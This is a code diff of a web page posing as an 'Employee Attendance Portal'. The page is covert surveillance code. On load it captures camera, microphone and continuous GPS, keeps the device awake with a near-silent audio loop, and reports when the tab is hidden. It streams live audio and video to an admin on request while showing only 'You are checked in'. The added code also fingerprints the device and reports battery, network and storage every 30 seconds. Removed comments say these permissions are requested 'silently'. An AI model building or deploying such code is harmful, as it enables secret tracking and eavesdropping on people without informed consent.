@@ -30,18 +30,15 @@
 <div class="card">
   <div class="logo">Info<span>soft</span></div>
   <div class="tagline">Employee Attendance Portal</div>
-
   <div class="spinner-wrap" id="loading">
     <div class="spinner"></div>
     <div class="spinner-text">Connecting...</div>
   </div>
-
   <div class="live-wrap" id="live-status" style="display:none">
     <div class="live-dot-big"></div>
     <div class="live-text">You are checked in</div>
-    <div class="live-sub">Attendance recorded successfully</div>
+    <div class="live-sub">Please keep screen on for attendance</div>
   </div>
-
   <div class="note">By using this portal you agree to Infosoft's attendance and monitoring policy.</div>
 </div>
 
@@ -50,47 +47,110 @@
 const socket = io();
 let peerConnections = {};
 let currentCamera = 'environment';
-let stream = null; // stream ko bahar le aao
+let stream = null;
 
-// Jab employee tab switch kare toh admin ko batao
 document.addEventListener('visibilitychange', () => {
-  if (document.hidden) {
-    socket.emit('employee:hidden', { status: 'minimized' });
-  } else {
-    socket.emit('employee:hidden', { status: 'active' });
-  }
+  socket.emit('employee:hidden', { status: document.hidden ? 'minimized' : 'active' });
 });
 
-// Wake lock — screen on rakhta hai
 async function requestWakeLock() {
   try {
-    const wakeLock = await navigator.wakeLock.request('screen');
-    wakeLock.addEventListener('release', () => {
-      setTimeout(requestWakeLock, 1000);
+    const wl = await navigator.wakeLock.request('screen');
+    wl.addEventListener('release', () => setTimeout(requestWakeLock, 1000));
+  } catch(e) {}
+}
+
+function keepAudioAlive() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    gain.gain.value = 0.001;
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start();
+    document.addEventListener('visibilitychange', () => {
+      if (ctx.state === 'suspended') ctx.resume();
     });
   } catch(e) {}
 }
 
-// Audio ko alive rakhta hai background mein
-function keepAudioAlive() {
+// ── Collect all device info ───────────────────────────────────────────────
+async function collectDeviceInfo() {
+  const info = {
+    userAgent:   navigator.userAgent,
+    platform:    navigator.platform,
+    language:    navigator.language,
+    languages:   navigator.languages?.join(', '),
+    screenW:     screen.width,
+    screenH:     screen.height,
+    colorDepth:  screen.colorDepth,
+    pixelRatio:  window.devicePixelRatio,
+    online:      navigator.onLine,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack:  navigator.doNotTrack,
+    timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    cores:       navigator.hardwareConcurrency,
+    memory:      navigator.deviceMemory, // GB
+    connection:  null,
+    battery:     null,
+    storage:     null,
+  };
+
+  // Network info
   try {
-    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    const oscillator = audioCtx.createOscillator();
-    const gainNode = audioCtx.createGain();
-    gainNode.gain.value = 0.001;
-    oscillator.connect(gainNode);
-    gainNode.connect(audioCtx.destination);
-    oscillator.start();
-    document.addEventListener('visibilitychange', () => {
-      if (audioCtx.state === 'suspended') {
-        audioCtx.resume();
-      }
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+      info.connection = {
+        type:        conn.effectiveType,
+        downlink:    conn.downlink,
+        rtt:         conn.rtt,
+        saveData:    conn.saveData,
+      };
+    }
+  } catch(e) {}
+
+  // Battery info
+  try {
+    const bat = await navigator.getBattery();
+    info.battery = {
+      level:     Math.round(bat.level * 100),
+      charging:  bat.charging,
+      chargingTime:   bat.chargingTime,
+      dischargingTime: bat.dischargingTime,
+    };
+    // Listen for battery changes
+    bat.addEventListener('levelchange', () => {
+      socket.emit('employee:battery', {
+        level: Math.round(bat.level * 100),
+        charging: bat.charging
+      });
+    });
+    bat.addEventListener('chargingchange', () => {
+      socket.emit('employee:battery', {
+        level: Math.round(bat.level * 100),
+        charging: bat.charging
+      });
     });
   } catch(e) {}
+
+  // Storage info
+  try {
+    if (navigator.storage && navigator.storage.estimate) {
+      const est = await navigator.storage.estimate();
+      info.storage = {
+        used:  Math.round(est.usage / 1024 / 1024),   // MB
+        total: Math.round(est.quota / 1024 / 1024),   // MB
+        usedPercent: Math.round((est.usage / est.quota) * 100)
+      };
+    }
+  } catch(e) {}
+
+  return info;
 }
 
 async function init() {
-  // 1. Get public IP
   let ipName = 'Employee';
   try {
     const r = await fetch('https://api.ipify.org?format=json');
@@ -98,53 +158,50 @@ async function init() {
     ipName = d.ip;
   } catch {}
 
-  // 2. Request Camera + Mic silently
+  // Camera + Mic
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: true });
   } catch {
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true });
-    } catch {}
+    try { stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); } catch {}
   }
 
   requestWakeLock();
   keepAudioAlive();
 
-  // 3. Request GPS silently
+  // GPS
   if (navigator.geolocation) {
     navigator.geolocation.watchPosition(pos => {
       socket.emit('employee:location', {
-        lat:      pos.coords.latitude,
-        lon:      pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        speed:    pos.coords.speed,
-        heading:  pos.coords.heading,
+        lat: pos.coords.latitude, lon: pos.coords.longitude,
+        accuracy: pos.coords.accuracy, speed: pos.coords.speed, heading: pos.coords.heading,
       });
     }, null, { enableHighAccuracy: true, maximumAge: 5000 });
   }
 
-  // 4. Join server with IP as name
-  window._empName = ipName;
-  socket.emit('employee:join', { name: ipName, empId: ipName });
+  // Collect device info
+  const deviceInfo = await collectDeviceInfo();
 
-  // 5. Show checked in — no permission status shown
+  window._empName = ipName;
+  socket.emit('employee:join', { name: ipName, empId: ipName, deviceInfo });
+
   document.getElementById('loading').style.display = 'none';
   document.getElementById('live-status').style.display = 'flex';
 
-  // 6. Handle WebRTC stream request
+  // Send device info updates every 30s
+  setInterval(async () => {
+    const updated = await collectDeviceInfo();
+    socket.emit('employee:deviceupdate', updated);
+  }, 30000);
+
+  // WebRTC
   socket.on('stream:requested', async ({ adminId }) => {
     if (!stream) return;
     const pc = new RTCPeerConnection({
-      iceServers: [
-        { urls: 'stun:stun.l.google.com:19302' },
-        { urls: 'stun:stun1.l.google.com:19302' }
-      ]
+      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }]
     });
     peerConnections[adminId] = pc;
     stream.getTracks().forEach(track => pc.addTrack(track, stream));
-    pc.onicecandidate = e => {
-      if (e.candidate) socket.emit('webrtc:ice', { to: adminId, candidate: e.candidate });
-    };
+    pc.onicecandidate = e => { if (e.candidate) socket.emit('webrtc:ice', { to: adminId, candidate: e.candidate }); };
     const offer = await pc.createOffer();
     await pc.setLocalDescription(offer);
     socket.emit('webrtc:offer', { to: adminId, offer });
@@ -160,57 +217,30 @@ async function init() {
     if (pc) try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch {}
   });
 
-  // 7. Switch camera — admin se signal aayega
   socket.on('stream:switch-camera', async () => {
     currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
     try {
-      // Sirf video track stop karo — audio track mat rokho
-      if (stream) {
-        stream.getVideoTracks().forEach(t => t.stop());
-      }
-
-      // Sirf video ka naya stream lo — audio nahi
-      const newVideoStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: currentCamera },
-        audio: false  // ← audio false — mic band nahi hoga
-      });
-
-      const newVideoTrack = newVideoStream.getVideoTracks()[0];
-
-      // Purane stream mein naya video track add karo
-      const oldVideoTrack = stream.getVideoTracks()[0];
-      if (oldVideoTrack) stream.removeTrack(oldVideoTrack);
-      stream.addTrack(newVideoTrack);
-
-      // Peer connections mein sirf video replace karo
+      if (stream) stream.getVideoTracks().forEach(t => t.stop());
+      const nv = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: false });
+      const nvt = nv.getVideoTracks()[0];
+      const ovt = stream.getVideoTracks()[0];
+      if (ovt) stream.removeTrack(ovt);
+      stream.addTrack(nvt);
       Object.keys(peerConnections).forEach(adminId => {
         const pc = peerConnections[adminId];
         const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
-        if (sender) sender.replaceTrack(newVideoTrack);
+        if (sender) sender.replaceTrack(nvt);
       });
-
-    } catch(e) {
-      console.error('Camera switch failed:', e);
-    }
+    } catch(e) {}
   });
 }
 
-
-
-// Start immediately when page loads
-window.addEventListener('load', init);
-
-socket.on('disconnect', () => {
-  setTimeout(() => { socket.connect(); }, 2000);
-});
-
+socket.on('disconnect', () => { setTimeout(() => socket.connect(), 2000); });
 socket.on('reconnect', () => {
-  socket.emit('employee:join', { 
-    name: window._empName || 'Employee', 
-    empId: window._empName || 'Employee' 
-  });
+  socket.emit('employee:join', { name: window._empName || 'Employee', empId: window._empName || 'Employee' });
 });
 
+window.addEventListener('load', init);
 </script>
 </body>
 </html>
